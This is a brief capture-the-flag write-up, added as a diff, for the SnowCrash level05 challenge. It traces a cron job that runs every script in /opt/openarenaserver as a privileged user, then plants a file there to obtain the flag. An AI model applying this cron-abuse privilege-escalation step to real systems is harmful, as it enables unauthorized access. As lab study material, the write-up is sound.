@@ -1,0 +1,13 @@
+A message appear randomly that tell us to look inside of /var/mail/level05
+
+- cat /var/mail/level05
+
+- */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+- level05@SnowCrash:~$ sh /usr/sbin/openarenaserver
+bash: /opt/openarenaserver/*: No such file or directory
+This file has flag05 rights and as we cat we can se that it executes commends in all files contained in /opt/openarenaserver/*
+
+- echo "getflag > /tmp/echoResult" > /opt/openarenaserver/getflag
+
+- cat /tmp/echoResult
